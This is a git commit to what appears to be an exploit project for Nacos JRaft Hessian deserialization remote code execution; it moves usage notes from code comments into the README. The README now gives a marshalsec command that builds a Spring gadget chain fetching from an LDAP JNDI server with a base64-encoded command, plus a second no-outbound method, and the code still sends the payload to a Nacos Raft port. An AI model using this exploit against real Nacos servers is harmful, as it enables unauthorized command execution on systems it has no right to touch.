fa500bf082e2df2cd0cd45d44e686b1043cd0006
Nu1r <nuxm771@163.com>
2023-06-13 17:56:04 +0800

    修改说明文件

--- README.md
+++ README.md
@@ -1,2 +1,9 @@
 # Nacos JRaft Hessian 反序列化 RCE
 
+1. 利用方式一：通过 marshalsec 生成 SpringPartiallyComparableAdvisorHolder 利用链。需要出网。（JNDI LDAP 反序列化 + POJONode 触发 TemplatesImpl）
+
+```
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringPartiallyComparableAdvisorHolder ldap://127.0.0.1:1389/Deserialization/Jackson/nu1r/Base64/{base64编码的命令} | base64
+```
+
+2. 利用方式二：通过 build方法 生成利用链子，参数为命令即可，不用出网，但是只是执行命令，不能加载字节码。
--- src/main/java/org/example/Main.java
+++ src/main/java/org/example/Main.java
@@ -134,9 +134,6 @@ public class Main {
     }
 
     public static void main(String[] args) throws Exception {
-        // 利用方式一：通过 marshalsec 生成 SpringPartiallyComparableAdvisorHolder 利用链，参数为ldap://127.0.0.1/exp,生成Base64编码，需要出网。（JNDI LDAP 反序列化 + POJONode 触发 TemplatesImpl）
-        //     java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringPartiallyComparableAdvisorHolder ldap://127.0.0.1:1389/Deserialization/Jackson/nu1r/Base64/{base64编码的命令} | base64
-        // 利用方式二：通过 build方法 生成利用链子，参数为命令即可，不用出网，但是只是执行命令，不能加载字节码。（POJONode 触发 UnixPrintService）
         // 只能利用一次
         //byte[] bytes = build("calc");
         send1("127.0.0.1:7848", Base64.getDecoder().decode(""));
